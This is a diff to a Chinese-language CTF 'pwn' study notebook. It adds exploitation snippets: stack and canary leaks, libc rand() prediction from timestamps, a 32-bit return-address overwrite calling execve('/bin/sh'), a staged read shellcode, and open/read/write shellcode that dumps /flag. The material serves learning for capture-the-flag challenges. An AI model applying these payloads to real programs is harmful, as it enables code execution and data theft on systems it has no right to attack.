@@ -413,7 +413,8 @@ p.recvuntil(b"0x")
 address = int(p.recvuntil(b"a", drop=True), 16)
 
 #64位中获取地址
-u64(p.recv(6).ljust(8, "\x00") 
+u64(p.recv(6).ljust(8, "\x00")
+canary_add = u64(io.recv(8)) - 10
 
 # 自使用获取栈地址stack addr 0x10需自调整
 addr = io.recvuntil(',')[:-1]
@@ -422,8 +423,12 @@ ebp_addr = int("0x" + str(addr[::-1].hex()), 16) - 0x10
 leak_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
 print(hex(leak_addr))
 
+gdb.attach(io, "b main")
+    
 io.interactive()
 ```
+
+`\x00` 为一字节
 
 shellcode模块
 
@@ -869,6 +874,8 @@ jshiro@ubuntu:~/Desktop/ctf/xmcve/ROP$ ldd ret2stack
 
 ```Bash
 strings 可执行程序 #查看一些字符串如/bin/sh
+
+strings libc.so.6 | grep version # 查看libc版本
 ```
 
 ### gcc
@@ -1044,7 +1051,7 @@ if ( v1 == 10 ) xxx;    //v1为换行符，ASCII值为10
 void *ptr[2]; // 声明大小为2的指针数组
 ```
 
-C语言中字符串以"\x00"结尾，篡改字符串中的"\x00"可以导致泄露后续数据
+C语言中字符串以"\x00"结尾，篡改字符串中的"\x00"可以导致泄露后续数据如canary值
 
 **read函数调用的第一个参数：0标准输入，1标准输出，2标准错误**
 
@@ -1083,8 +1090,21 @@ SHIDWORD(v4)       //取高32位并作为有符号整数
 **SIGSEGV**
 
 ```C
+#include <signal.h>
 signal(SIGSEGV, sigsegv_handler);
 //使用该函数在发生segment fault时会调用自己定义的sigsegv_handler函数
+
+// 可查看对应整数
+printf("signal: %d\n", SIGABRT); // 6
+printf("signal: %d\n", SIGFPE);	 // 8
+printf("signal: %d\n", SIGILL);  // 4
+printf("signal: %d\n", SIGINT);  // 2
+printf("signal: %d\n", SIGSEGV); // 11
+printf("signal: %d\n", SIGTERM); // 15
+printf("signal: %d\n", SIGALRM); // 14
+
+signal(14, timeout_func);
+
 ```
 
 **函数**
@@ -1097,6 +1117,14 @@ long strtol(const char *str, char **endptr, int base);
 //接受十进制输入
 chr(i)//将Unicode码转换为字符
 atoi(&buf); //将 buf 中的字符串转换为整数
+
+getchar(); // 从标准输入读取一个字符，将其作为无符号字符强制转换为int返回
+// 在scanf前，则scanf时将需要多加一个字节
+__isoc99_scanf("%[^\n]s", v); // 表示输入直到回车
+
+scanf("%d", &array[i]); // 当传入+或-时会跳过scanf不改变该数组中的值
+
+strcmp(v1, v2); // 注意观察值可能在某处可泄露
 ```
 
 **mmap**
@@ -1304,10 +1332,12 @@ Executable and Linking Format 可执行和链接的格式
 
 1. **PLT（Procedure Linkage Table）:**
    1. `elf.plt['system']` 通常是用于调用共享库中的函数的入口点。PLT 中的代码负责将控制转移到真正的函数地址，这是通过动态链接的方式实现的。因此，PLT 中的地址是一个入口点，负责实际跳转到共享库中的函数。
+   1. 调用外部函数的一组跳转表，每个函数对应一个入口，包含可执行代码，覆盖返回地址为plt地址可最终跳转导向到got表中的函数地址处
 2. **Symbol Table:**
    1. `elf.symbols['system']` 返回的是 ELF 文件中符号表中 `system` 函数的地址。这个地址是在编译时确定的，是链接时的静态地址。在编译时，链接器会将符号解析为实际的地址。
 3. **GOT（Global Offset Table）:**
-   1. `elf.got['system']` 返回的是 ELF 文件中的 GOT 表中 `system` 函数的入口地址。GOT 表中的地址是一个指针，指向共享库中的真实函数地址。在运行时，当程序第一次调用一个共享库中的函数时，PLT 中的代码会更新 GOT 表中的地址，将其设置为实际函数的地址。
+   1. `elf.got['system']` 返回的是 ELF 文件中的 GOT 表中 `system` 函数的入口地址。全局表存储外部函数或库函数真实地址，GOT 表中的地址是一个指针，指向共享库/动态链接器中的真实函数地址。在运行时，当程序第一次调用一个共享库中的函数时，PLT 中的代码会更新 GOT 表中的地址，将其设置为实际函数的地址
+   1. 不用于直接调用，只保存了实际函数地址，不是可执行的指令，覆盖返回地址不用got表地址覆盖
 
 ### **进程执行**
 
@@ -1366,6 +1396,18 @@ srandom(v3->tm_yday); // 设置种子 为tm结构中的yday
 secret = random() // 种子数相同，多次得到的随机值相同
 ```
 
+利用**当前时间戳**进行预测
+
+```python
+from ctypes import cdll
+import time
+clib = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
+
+seed = int(time.time())
+clib.srand(seed)
+pwd = clib.rand()
+```
+
 **/dev/random**
 
 ```C
@@ -1382,6 +1424,19 @@ fclose(random_file);
 // 操作系统中不显式初始化种子
 secret = (unsigned int)arc4random() 
 ```
+
+若有循环函数及**模数**可以进行**爆破**
+
+```python
+for i in range(num):
+    num = i
+    io.sendline(str(num))
+    result = io.recvline()
+    if b"xxx" in result:
+        break
+```
+
+
 
 ## 整数溢出漏洞
 
@@ -1424,6 +1479,12 @@ retn
 
 ![img](/img/pwn_note.zh-cn.assets/-17284464998302.assets)
 
+32位栈的**三层嵌套**调用演示：
+
+![image-20241013134352978](/img/pwn_note.zh-cn.assets/image-20241013134352978.png)
+
+**注：**当局部变量是数组`v[2]`时，索引低的`v[0]`靠近rsp，地址更低，索引高的`v[1]`靠近rbp，地址更高
+
 **压栈**
 
 1. 被调用函数参数**逆序**压入栈内，esp→（arg1, arg2,...,argn）
@@ -1453,11 +1514,13 @@ retn
 
 ```C
 char buf[48]; // [rsp+0h] [rbp-30h] BYREF
-read(0, buf, 0x40uLL);
+read(0, buf, 0x40uLL); // 末尾不为0则打印出后续内容
 printf("%s", buf);
 ```
 
 构造`payload=b'a'*0x30`，接收48个a后会泄露出后续栈地址内容
+
+
 
 ### shellcode
 
@@ -1491,6 +1554,16 @@ setbuf(stdout, 0);
 //用于将输入输出缓冲区关闭，直接输出到屏幕输入到相应位置
 
 setbuf(bss_start, 0); // 禁用 bss_start 文件流处的缓冲区, 每次读写立即系统调用
+```
+
+**32位覆盖**返回地址
+
+```python
+payload = b'a'*padding + p32(execve_plt_addr) + p32(ret_addr) + p32(arg1) + p32(arg2) + p32(arg3)
+# arg1:/bin/sh_addr
+# arg2:argv[] = 0
+# arg3:envp[] = 0
+# ret_addr可随意填写, 指代execve函数执行后的返回地址
 ```
 
 **漏洞点**
@@ -1579,6 +1652,28 @@ xor edx, edx               ; 将寄存器 edx 清零                       \x31\
 syscall                    ; 执行系统调用                            \x0f\x05
 ```
 
+**当前方执行完read函数就执行shellcode，且此时输入极少**
+
+```c
+read(0, (void *)0x20240000, 0xDuLL);
+	mov     edx, 0Dh        ; nbytes
+	mov     esi, 20240000h  ; buf
+	mov     edi, 0          ; fd
+	call    _read
+MEMORY[0xdead]();
+	... // esi和edi未被改变
+	call    rdx
+```
+
+可以输入以下绕过：
+
+```python
+bypass = asm("""
+	mov rdx, 0x1000
+	syscall ; 再次read系统调用再送入一次shellcode执行	
+""")
+```
+
 **Open syscall shellcode**
 
 ```Python
@@ -1603,8 +1698,37 @@ shellcode2 = asm("""
     ret                     /* 为了返回源程序 */
 flag: .ascii "flag"
     
-""")
+""") # 使用该情况要注意shellcode前后影响因素，flag后加入b'\x00'及前方加入b'\x90'(nop)
 ```
+
+**ORW**
+
+```python
+addr = 0xdead
+flag_addr = addr + 0x100 # flag硬写入内存中
+
+shellcode = f"""
+    mov rax, 2
+    mov rdi, {flag_addr}
+    mov rsi, 0
+    syscall
+    
+    xor rax, rax
+    mov rdi, 3
+    mov rsi, {flag_addr}
+    mov rdx, 0x40
+    syscall
+    
+    mov rax, 1
+    mov rdi, 1
+    syscall
+"""
+pay = b'\x90'*0x10 + asm(shellcode) # 第二次读需要重新覆盖前面0x10地址
+payload = pay.ljust(0x100, b'\x90') + b'/flag\x00\x00\x00' 
+# 可能需要gdb微调在前后加\x00或\x90使刚好对应地址读取flag而不是flagxx
+```
+
+
 
 ## ROP
 
@@ -2264,6 +2388,16 @@ printf((const char *)&v5, &v5);  // 将v5的内容作为字符串格式打印到
 
 - 采用prctl函数调用
 - 使用seccomp库函数
+
+**seccomp**
+
+```c
+v = seccomp_init(111LL); // 初始化，参数表示用于过滤的操作模式
+seccomp_rule_add(v, 0LL, 59LL, 0LL); // 禁用59系统调用号execve
+seccomp_load(v); // 加载过滤器
+```
+
+
 
 ### /proc泄露
 
